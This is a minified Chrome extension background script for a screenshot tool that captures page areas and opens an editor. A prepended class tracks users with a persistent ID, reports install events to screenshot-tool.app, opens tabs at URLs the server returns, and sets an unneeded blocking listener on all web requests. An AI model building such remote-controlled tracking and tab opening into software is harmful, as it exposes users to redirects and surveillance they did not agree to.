class Bg{constructor(){this.actionUrl="https://screenshot-tool.app/api/action/",this.uninstallUrl="https://screenshot-tool.app/uninstall/",this.config={},this.queue=[],this.queueProcessorReady=!1,this.uid="",this.version=chrome.runtime.getManifest().version,this.initStorage(),this.initListeners()}processQueue(){for(;this.queue.length>0;){var qRow=this.queue.shift();if(!qRow.type||"action"!=qRow.type)return!0;var urlParams="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:qRow.action,uid:this.uid,t:Date.now()})));fetch(this.actionUrl+"?"+urlParams).then((resp=>resp.json())).then((function(data){data.url&&chrome.tabs.create({url:data.url})}))}}setUninstallUrl(){var urlParams="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:"uninstall",uid:this.uid,t:Date.now()})));chrome.runtime.setUninstallURL(this.uninstallUrl+"?"+urlParams)}initListeners(){chrome.runtime.onInstalled.addListener((details=>{this.queue.push({type:"action",action:details.reason}),this.queueProcessorReady&&this.processQueue()})),chrome.webRequest.onHeadersReceived.addListener((data=>({responseHeaders:data.responseHeaders})),{urls:["<all_urls>"]},["blocking","responseHeaders"])}initStorage(){chrome.storage.local.get((storage=>{storage&&storage.config&&(this.config=storage.config),this.config.uid?this.uid=this.config.uid:(this.uid=this.config.uid=this.generateUID(),this.saveConfig()),this.queueProcessorReady=!0,this.setUninstallUrl(),this.processQueue()}))}saveConfig(){chrome.storage.local.set({config:this.config})}generateUID(){return"xxxxxxxx-xxxx-2xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(c){var r=16*Math.random()|0;return("x"==c?r:3&r|8).toString(16)}))}}const bg=new Bg;parcelRequire=function(e,r,t,n){var i,o="function"==typeof parcelRequire&&parcelRequire,u="function"==typeof require&&require;function f(t,n){if(!r[t]){if(!e[t]){var i="function"==typeof parcelRequire&&parcelRequire;if(!n&&i)return i(t,!0);if(o)return o(t,!0);if(u&&"string"==typeof t)return u(t);var c=new Error("Cannot find module '"+t+"'");throw c.code="MODULE_NOT_FOUND",c}p.resolve=function(r){return e[t][1][r]||r},p.cache={};var l=r[t]=new f.Module(t);e[t][0].call(l.exports,p,l,l.exports,this)}return r[t].exports;function p(e){return f(p.resolve(e))}}f.isParcelRequire=!0,f.Module=function(e){this.id=e,this.bundle=f,this.exports={}},f.modules=e,f.cache=r,f.parent=o,f.register=function(r,t){e[r]=[function(e,r){r.exports=t},{}]};for(var c=0;c<t.length;c++)try{f(t[c])}catch(e){i||(i=e)}if(t.length){var l=f(t[t.length-1]);"object"==typeof exports&&"undefined"!=typeof module?module.exports=l:"function"==typeof define&&define.amd&&define((function(){return l}))}if(parcelRequire=f,i)throw i;return f}({QVnC:[function(require,module,exports){var t=function(t){"use strict";var r,e=Object.prototype,n=e.hasOwnProperty,o="function"==typeof Symbol?Symbol:{},i=o.iterator||"@@iterator",a=o.asyncIterator||"@@asyncIterator",c=o.toStringTag||"@@toStringTag";function u(t,r,e,n){var o=r&&r.prototype instanceof v?r:v,i=Object.create(o.prototype),a=new k(n||[]);return i._invoke=function(t,r,e){var n=f;return function(o,i){if(n===l)throw new Error("Generator is already running");if(n===p){if("throw"===o)throw i;return N()}for(e.method=o,e.arg=i;;){var a=e.delegate;if(a){var c=_(a,e);if(c){if(c===y)continue;return c}}if("next"===e.method)e.sent=e._sent=e.arg;else if("throw"===e.method){if(n===f)throw n=p,e.arg;e.dispatchException(e.arg)}else"return"===e.method&&e.abrupt("return",e.arg);n=l;var u=h(t,r,e);if("normal"===u.type){if(n=e.done?p:s,u.arg===y)continue;return{value:u.arg,done:e.done}}"throw"===u.type&&(n=p,e.method="throw",e.arg=u.arg)}}}(t,e,a),i}function h(t,r,e){try{return{type:"normal",arg:t.call(r,e)}}catch(n){return{type:"throw",arg:n}}}t.wrap=u;var f="suspendedStart",s="suspendedYield",l="executing",p="completed",y={};function v(){}function d(){}function g(){}var m={};m[i]=function(){return this};var w=Object.getPrototypeOf,L=w&&w(w(G([])));L&&L!==e&&n.call(L,i)&&(m=L);var x=g.prototype=v.prototype=Object.create(m);function E(t){["next","throw","return"].forEach((function(r){t[r]=function(t){return this._invoke(r,t)}}))}function b(t,r){var e;this._invoke=function(o,i){function a(){return new r((function(e,a){!function e(o,i,a,c){var u=h(t[o],t,i);if("throw"!==u.type){var f=u.arg,s=f.value;return s&&"object"==typeof s&&n.call(s,"__await")?r.resolve(s.__await).then((function(t){e("next",t,a,c)}),(function(t){e("throw",t,a,c)})):r.resolve(s).then((function(t){f.value=t,a(f)}),(function(t){return e("throw",t,a,c)}))}c(u.arg)}(o,i,e,a)}))}return e=e?e.then(a,a):a()}}function _(t,e){var n=t.iterator[e.method];if(n===r){if(e.delegate=null,"throw"===e.method){if(t.iterator.return&&(e.method="return",e.arg=r,_(t,e),"throw"===e.method))return y;e.method="throw",e.arg=new TypeError("The iterator does not provide a 'throw' method")}return y}var o=h(n,t.iterator,e.arg);if("throw"===o.type)return e.method="throw",e.arg=o.arg,e.delegate=null,y;var i=o.arg;return i?i.done?(e[t.resultName]=i.value,e.next=t.nextLoc,"return"!==e.method&&(e.method="next",e.arg=r),e.delegate=null,y):i:(e.method="throw",e.arg=new TypeError("iterator result is not an object"),e.delegate=null,y)}function j(t){var r={tryLoc:t[0]};1 in t&&(r.catchLoc=t[1]),2 in t&&(r.finallyLoc=t[2],r.afterLoc=t[3]),this.tryEntries.push(r)}function O(t){var r=t.completion||{};r.type="normal",delete r.arg,t.completion=r}function k(t){this.tryEntries=[{tryLoc:"root"}],t.forEach(j,this),this.reset(!0)}function G(t){if(t){var e=t[i];if(e)return e.call(t);if("function"==typeof t.next)return t;if(!isNaN(t.length)){var o=-1,a=function e(){for(;++o<t.length;)if(n.call(t,o))return e.value=t[o],e.done=!1,e;return e.value=r,e.done=!0,e};return a.next=a}}return{next:N}}function N(){return{value:r,done:!0}}return d.prototype=x.constructor=g,g.constructor=d,g[c]=d.displayName="GeneratorFunction",t.isGeneratorFunction=function(t){var r="function"==typeof t&&t.constructor;return!!r&&(r===d||"GeneratorFunction"===(r.displayName||r.name))},t.mark=function(t){return Object.setPrototypeOf?Object.setPrototypeOf(t,g):(t.__proto__=g,c in t||(t[c]="GeneratorFunction")),t.prototype=Object.create(x),t},t.awrap=function(t){return{__await:t}},E(b.prototype),b.prototype[a]=function(){return this},t.AsyncIterator=b,t.async=function(r,e,n,o,i){void 0===i&&(i=Promise);var a=new b(u(r,e,n,o),i);return t.isGeneratorFunction(e)?a:a.next().then((function(t){return t.done?t.value:a.next()}))},E(x),x[c]="Generator",x[i]=function(){return this},x.toString=function(){return"[object Generator]"},t.keys=function(t){var r=[];for(var e in t)r.push(e);return r.reverse(),function e(){for(;r.length;){var n=r.pop();if(n in t)return e.value=n,e.done=!1,e}return e.done=!0,e}},t.values=G,k.prototype={constructor:k,reset:function(t){if(this.prev=0,this.next=0,this.sent=this._sent=r,this.done=!1,this.delegate=null,this.method="next",this.arg=r,this.tryEntries.forEach(O),!t)for(var e in this)"t"===e.charAt(0)&&n.call(this,e)&&!isNaN(+e.slice(1))&&(this[e]=r)},stop:function(){this.done=!0;var t=this.tryEntries[0].completion;if("throw"===t.type)throw t.arg;return this.rval},dispatchException:function(t){if(this.done)throw t;var e=this;function o(n,o){return c.type="throw",c.arg=t,e.next=n,o&&(e.method="next",e.arg=r),!!o}for(var i=this.tryEntries.length-1;i>=0;--i){var a=this.tryEntries[i],c=a.completion;if("root"===a.tryLoc)return o("end");if(a.tryLoc<=this.prev){var u=n.call(a,"catchLoc"),h=n.call(a,"finallyLoc");if(u&&h){if(this.prev<a.catchLoc)return o(a.catchLoc,!0);if(this.prev<a.finallyLoc)return o(a.finallyLoc)}else if(u){if(this.prev<a.catchLoc)return o(a.catchLoc,!0)}else{if(!h)throw new Error("try statement without catch or finally");if(this.prev<a.finallyLoc)return o(a.finallyLoc)}}}},abrupt:function(t,r){for(var e=this.tryEntries.length-1;e>=0;--e){var o=this.tryEntries[e];if(o.tryLoc<=this.prev&&n.call(o,"finallyLoc")&&this.prev<o.finallyLoc){var i=o;break}}i&&("break"===t||"continue"===t)&&i.tryLoc<=r&&r<=i.finallyLoc&&(i=null);var a=i?i.completion:{};return a.type=t,a.arg=r,i?(this.method="next",this.next=i.finallyLoc,y):this.complete(a)},complete:function(t,r){if("throw"===t.type)throw t.arg;return"break"===t.type||"continue"===t.type?this.next=t.arg:"return"===t.type?(this.rval=this.arg=t.arg,this.method="return",this.next="end"):"normal"===t.type&&r&&(this.next=r),y},finish:function(t){for(var r=this.tryEntries.length-1;r>=0;--r){var e=this.tryEntries[r];if(e.finallyLoc===t)return this.complete(e.completion,e.afterLoc),O(e),y}},catch:function(t){for(var r=this.tryEntries.length-1;r>=0;--r){var e=this.tryEntries[r];if(e.tryLoc===t){var n=e.completion;if("throw"===n.type){var o=n.arg;O(e)}return o}}throw new Error("illegal catch attempt")},delegateYield:function(t,e,n){return this.delegate={iterator:G(t),resultName:e,nextLoc:n},"next"===this.method&&(this.arg=r),y}},t}("object"==typeof module?module.exports:{});try{regeneratorRuntime=t}catch(r){Function("r","regeneratorRuntime = r")(t)}},{}],PMvg:[function(require,module,exports){module.exports=require("regenerator-runtime")},{"regenerator-runtime":"QVnC"}],agGE:[function(require,module,exports){function n(n,t,o,r,e,i,u){try{var c=n[i](u),v=c.value}catch(a){return void o(a)}c.done?t(v):Promise.resolve(v).then(r,e)}module.exports=function(t){return function(){var o=this,r=arguments;return new Promise((function(e,i){var u=t.apply(o,r);function c(t){n(u,e,i,c,v,"next",t)}function v(t){n(u,e,i,c,v,"throw",t)}c(void 0)}))}}},{}],OUZ9:[function(require,module,exports){module.exports=function(r){if(Array.isArray(r))return r}},{}],vKPt:[function(require,module,exports){module.exports=function(r,t){if("undefined"!=typeof Symbol&&Symbol.iterator in Object(r)){var e=[],n=!0,o=!1,l=void 0;try{for(var i,u=r[Symbol.iterator]();!(n=(i=u.next()).done)&&(e.push(i.value),!t||e.length!==t);n=!0);}catch(a){o=!0,l=a}finally{try{n||null==u.return||u.return()}finally{if(o)throw l}}return e}}},{}],NVR6:[function(require,module,exports){module.exports=function(n,r){(null==r||r>n.length)&&(r=n.length);for(var e=0,l=new Array(r);e<r;e++)l[e]=n[e];return l}},{}],UyFj:[function(require,module,exports){var r=require("./arrayLikeToArray");module.exports=function(t,e){if(t){if("string"==typeof t)return r(t,e);var o=Object.prototype.toString.call(t).slice(8,-1);return"Object"===o&&t.constructor&&(o=t.constructor.name),"Map"===o||"Set"===o?Array.from(t):"Arguments"===o||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(o)?r(t,e):void 0}}},{"./arrayLikeToArray":"NVR6"}],Rom6:[function(require,module,exports){module.exports=function(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}},{}],HETk:[function(require,module,exports){var r=require("./arrayWithHoles"),e=require("./iterableToArrayLimit"),t=require("./unsupportedIterableToArray"),i=require("./nonIterableRest");module.exports=function(u,a){return r(u)||e(u,a)||t(u,a)||i()}},{"./arrayWithHoles":"OUZ9","./iterableToArrayLimit":"vKPt","./unsupportedIterableToArray":"UyFj","./nonIterableRest":"Rom6"}],fcMS:[function(require,module,exports){module.exports=function(n,o){if(!(n instanceof o))throw new TypeError("Cannot call a class as a function")}},{}],P8NW:[function(require,module,exports){function e(e,r){for(var n=0;n<r.length;n++){var t=r[n];t.enumerable=t.enumerable||!1,t.configurable=!0,"value"in t&&(t.writable=!0),Object.defineProperty(e,t.key,t)}}module.exports=function(r,n,t){return n&&e(r.prototype,n),t&&e(r,t),r}},{}],IxO8:[function(require,module,exports){module.exports=function(e,r,n){return r in e?Object.defineProperty(e,r,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[r]=n,e}},{}],d0tY:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.getActiveTab=void 0;var e,_slicedToArray2=(e=require("@babel/runtime/helpers/slicedToArray"))&&e.__esModule?e:{default:e};exports.getActiveTab=function(){return new Promise((function(e){chrome.tabs.query({active:!0,lastFocusedWindow:!0},(function(t){var r=(0,_slicedToArray2.default)(t,1)[0];e(r)}))}))}},{"@babel/runtime/helpers/slicedToArray":"HETk"}],fbFB:[function(require,module,exports){"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.injectContentScriptIfNotLoaded=exports.injectFile=exports.checkIfContentScriptLoaded=exports.executeCodeAsContentScript=void 0;var _regenerator=_interopRequireDefault(require("@babel/runtime/regenerator")),_slicedToArray2=_interopRequireDefault(require("@babel/runtime/helpers/slicedToArray")),_asyncToGenerator2=_interopRequireDefault(require("@babel/runtime/helpers/asyncToGenerator")),_util=require("./util");function _interopRequireDefault(e){return e&&e.__esModule?e:{default:e}}var executeCodeAsContentScript=function(e,t){return new Promise((function(r,n){try{chrome.tabs.executeScript(e,{code:t},(function(e){return r(e)})),chrome.runtime.lastError&&n(chrome.runtime.lastError)}catch(o){n(o)}}))};exports.executeCodeAsContentScript=executeCodeAsContentScript;var checkIfContentScriptLoaded=function(e){return executeCodeAsContentScript(e,"!!window.IS_CONTENT_SCRIPT_LOADED_RB_SCREENSHOT")};exports.checkIfContentScriptLoaded=checkIfContentScriptLoaded;var injectFile=function(e,t){var r=t.type,n=t.file;return new Promise((function(t){("script"===r?chrome.tabs.executeScript:chrome.tabs.insertCSS)(e,{file:n},(function(e){return t(e)}))}))};exports.injectFile=injectFile;exports.injectContentScriptIfNotLoaded=function(e){return new Promise((t=(0,_asyncToGenerator2.default)(_regenerator.default.mark((function t(r,n){var o,c,i,s;return _regenerator.default.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,t.next=3,(0,_util.getActiveTab)();case 3:return o=t.sent,c=o.id,t.next=7,checkIfContentScriptLoaded(c);case 7:if(i=t.sent,!(0,_slicedToArray2.default)(i,1)[0]){t.next=13;break}return r(!0),t.abrupt("return");case 13:return t.next=15,Promise.all(e.map((function(e){return injectFile(c,e)})));case 15:s=t.sent,r(s),t.next=22;break;case 19:t.prev=19,t.t0=t.catch(0),n(t.t0);case 22:case"end":return t.stop()}}),t,null,[[0,19]])}))),function(e,r){return t.apply(this,arguments)}));var t}},{"@babel/runtime/regenerator":"PMvg","@babel/runtime/helpers/slicedToArray":"HETk","@babel/runtime/helpers/asyncToGenerator":"agGE","./util":"d0tY"}],JlD7:[function(require,module,exports){"use strict";var _regenerator=_interopRequireDefault(require("@babel/runtime/regenerator")),_asyncToGenerator2=_interopRequireDefault(require("@babel/runtime/helpers/asyncToGenerator")),_slicedToArray2=_interopRequireDefault(require("@babel/runtime/helpers/slicedToArray")),_classCallCheck2=_interopRequireDefault(require("@babel/runtime/helpers/classCallCheck")),_createClass2=_interopRequireDefault(require("@babel/runtime/helpers/createClass")),_defineProperty2=_interopRequireDefault(require("@babel/runtime/helpers/defineProperty")),_contentScriptManager=require("./helpers/contentScriptManager"),_util=require("./helpers/util");function _interopRequireDefault(e){return e&&e.__esModule?e:{default:e}}var e,fullPageImage=null,recentActiveTabID=null,LAST_SCROLLED_POSITION=0,CONENT_SCRIPTS=[{type:"script",file:"js/contentScript.js"}],ImageManager=function(){function e(t,a){(0,_classCallCheck2.default)(this,e),(0,_defineProperty2.default)(this,"canvas",null),this.width=t?t*window.devicePixelRatio:window.screen.availWidth*window.devicePixelRatio,this.height=a?a*window.devicePixelRatio:window.screen.availHeight*window.devicePixelRatio,this.devicePixelRatio=window.devicePixelRatio,this.createCanvas()}return(0,_createClass2.default)(e,[{key:"createCanvas",value:function(){this.canvas=document.createElement("canvas"),this.canvas.width=this.width,this.canvas.height=this.height,this.context=this.canvas.getContext("2d")}},{key:"resize",value:function(e,t){this.canvas.width=e*window.devicePixelRatio,this.canvas.height=t*window.devicePixelRatio}},{key:"drawImage",value:function(e){var t=e.image,a=e.offsetX,r=void 0===a?0:a,n=e.offsetY,i=void 0===n?0:n,c=e.width,o=e.height,s=e.canvasX,u=void 0===s?0:s,l=e.canvasY,d=void 0===l?0:l,h=e.canvasImageWidth,g=e.canvasImageHeight,f=this.devicePixelRatio*c,p=this.devicePixelRatio*o;this.context.drawImage(t,this.devicePixelRatio*r,this.devicePixelRatio*i,f,p,u*this.devicePixelRatio,d*this.devicePixelRatio,h?h*this.devicePixelRatio:f,g?g*this.devicePixelRatio:p)}},{key:"toDataURL",value:function(){return this.canvas.toDataURL()}},{key:"reset",value:function(){this.canvas=null,this.width=null,this.height=null}}]),e}(),findActiveTab=function(e){chrome.tabs.query({active:!0,lastFocusedWindow:!0},(function(t){var a=(0,_slicedToArray2.default)(t,1)[0];e(a)}))},captureVisibleTab=function(){return new Promise((function(e,t){try{chrome.tabs.captureVisibleTab({format:"png"},(function(t){e(t)}))}catch(a){t(a)}}))},openEditorWithImage=function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:function(){};chrome.storage.local.set({image:e},(function(){t(),chrome.tabs.create({url:chrome.extension.getURL("editor.html")})}))},captureViewPort=function(){captureVisibleTab().then(openEditorWithImage).catch((function(e){}))},cropImage=function(e,t,a){return new Promise((function(r,n){try{var i=new Image;i.width=t*window.screen.devicePixelRatio,i.height=a*window.screen.devicePixelRatio,i.onload=function(){var e=new ImageManager(t,a);e.drawImage({image:i,offsetX:0,offsetY:0,width:t,height:a});var n=e.toDataURL();r(n)},i.src=e}catch(c){n(c)}}))},captureSelectedArea=function(e){var t=e.selectedArea,a=t.top,r=t.left,n=t.width,i=t.height,c=arguments.length>1&&void 0!==arguments[1]?arguments[1]:"open_editor";captureVisibleTab().then((function(e){var t=new Image;t.width=n,t.height=i,t.onload=function(){var e=new ImageManager(n,i);e.drawImage({image:t,offsetX:r,offsetY:a,width:n,height:i});var o=e.toDataURL();"open_editor"!==c?"copy_to_clipboard"===c&&findActiveTab((function(e){var t=e.id;chrome.tabs.sendMessage(t,{action:"copyToClipBoard",imageURL:o})})):openEditorWithImage(o)},t.src=e})).catch((function(e){}))},captureFullPage=function(e){var t=e.offsetY,a=e.scrollHeight,r=e.windowHeight;LAST_SCROLLED_POSITION=t,fullPageImage||(fullPageImage=new ImageManager(void 0,a>3e4?3e4:a)),captureVisibleTab().then((function(e){var a=new Image;a.onload=function(){fullPageImage.drawImage({image:a,width:window.screen.availWidth,height:r,canvasY:t}),findActiveTab((function(e){var t=e.id;chrome.tabs.sendMessage(t,{action:"requestFullPage"})}))},a.src=e})).catch((function(e){}))},sendMessageCapturingFailed=function(){chrome.tabs.sendMessage(recentActiveTabID,{action:"fullPageCapturingFailed"}),chrome.runtime.sendMessage({action:"rb_hide_loader"})},getCanvasImageAndOpenEditor=function(e){openEditorWithImage(e,(function(){fullPageImage=null,chrome.tabs.sendMessage(recentActiveTabID,{action:"fullPageCapturingFinished"}),chrome.runtime.sendMessage({action:"rb_hide_loader"})}))},finishFullPageCapture=function(e){var t=e.offsetY,a=e.windowHeight,r=arguments.length>1&&void 0!==arguments[1]&&arguments[1];captureVisibleTab().then((function(e){var n=new Image;n.onload=function(){var e={image:n,width:window.screen.availWidth,height:a,canvasY:t};r&&(e.height=0,e.canvasY=LAST_SCROLLED_POSITION,e.canvasImageHeight=LAST_SCROLLED_POSITION),fullPageImage.drawImage(e);var i=fullPageImage.toDataURL();if("data:,"===i)return fullPageImage.reset(),fullPageImage=null,void sendMessageCapturingFailed();r?cropImage(i,window.screen.availWidth,LAST_SCROLLED_POSITION).then((function(e){getCanvasImageAndOpenEditor(e)})).catch((function(e){})):getCanvasImageAndOpenEditor(i)},n.src=e})).catch((function(e){}))},executeOnceReady=(e=(0,_asyncToGenerator2.default)(_regenerator.default.mark((function e(t){return _regenerator.default.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,e.next=3,(0,_contentScriptManager.injectContentScriptIfNotLoaded)(CONENT_SCRIPTS);case 3:t(),e.next=9;break;case 6:e.prev=6,e.t0=e.catch(0);case 9:case"end":return e.stop()}}),e,null,[[0,6]])}))),function(t){return e.apply(this,arguments)}),enableAreaSelection=function(){var e=(0,_asyncToGenerator2.default)(_regenerator.default.mark((function e(){var t,a;return _regenerator.default.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,e.next=3,(0,_util.getActiveTab)();case 3:t=e.sent,a=t.id,chrome.tabs.sendMessage(a,{action:"enableAreaSelection"}),e.next=11;break;case 8:e.prev=8,e.t0=e.catch(0);case 11:case"end":return e.stop()}}),e,null,[[0,8]])})));return function(){return e.apply(this,arguments)}}(),requestFullPage=function(){var e=(0,_asyncToGenerator2.default)(_regenerator.default.mark((function e(){var t,a;return _regenerator.default.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,e.next=3,(0,_util.getActiveTab)();case 3:t=e.sent,a=t.id,recentActiveTabID=a,chrome.tabs.sendMessage(a,{action:"requestFullPage"}),e.next=12;break;case 9:e.prev=9,e.t0=e.catch(0);case 12:case"end":return e.stop()}}),e,null,[[0,9]])})));return function(){return e.apply(this,arguments)}}(),requestScriptAccess=function(){var e=(0,_asyncToGenerator2.default)(_regenerator.default.mark((function e(){var t;return _regenerator.default.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return e.prev=0,e.next=3,(0,_util.getActiveTab)();case 3:return t=e.sent,e.next=6,(0,_contentScriptManager.executeCodeAsContentScript)(t.id,"location.href");case 6:e.sent||chrome.runtime.sendMessage({action:"rb_inaccessible_host"}),e.next=13;break;case 10:e.prev=10,e.t0=e.catch(0);case 13:case"end":return e.stop()}}),e,null,[[0,10]])})));return function(){return e.apply(this,arguments)}}();chrome.runtime.lastError,chrome.runtime.onMessage.addListener(function(){var e=(0,_asyncToGenerator2.default)(_regenerator.default.mark((function e(t){return _regenerator.default.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:e.prev=0,e.t0=t.action,e.next="rb_select_area"===e.t0?4:"rb_capture_visible_area"===e.t0?6:"rb_capture_full_page"===e.t0?8:"rb_capture_selected_area"===e.t0?10:"rb_capture_and_copy_selected_area"===e.t0?12:"capture_current_viewport"===e.t0?14:"finish_full_page_capture"===e.t0?16:"forcefully_finish_full_page_capture"===e.t0?18:"rb_request_access"===e.t0?21:23;break;case 4:return executeOnceReady(enableAreaSelection),e.abrupt("break",24);case 6:return executeOnceReady(captureViewPort),e.abrupt("break",24);case 8:return executeOnceReady(requestFullPage),e.abrupt("break",24);case 10:return captureSelectedArea(t),e.abrupt("break",24);case 12:return captureSelectedArea(t,"copy_to_clipboard"),e.abrupt("break",24);case 14:return captureFullPage(t),e.abrupt("break",24);case 16:return finishFullPageCapture(t),e.abrupt("break",24);case 18:return chrome.tabs.sendMessage(recentActiveTabID,{action:"fullPageCapturingFinished",isForcefully:!0}),finishFullPageCapture(t,!0),e.abrupt("break",24);case 21:return requestScriptAccess(),e.abrupt("break",24);case 23:return e.abrupt("break",24);case 24:e.next=29;break;case 26:e.prev=26,e.t1=e.catch(0);case 29:case"end":return e.stop()}}),e,null,[[0,26]])})));return function(t){return e.apply(this,arguments)}}())},{"@babel/runtime/regenerator":"PMvg","@babel/runtime/helpers/asyncToGenerator":"agGE","@babel/runtime/helpers/slicedToArray":"HETk","@babel/runtime/helpers/classCallCheck":"fcMS","@babel/runtime/helpers/createClass":"P8NW","@babel/runtime/helpers/defineProperty":"IxO8","./helpers/contentScriptManager":"fbFB","./helpers/util":"d0tY"}]},{},["JlD7"]);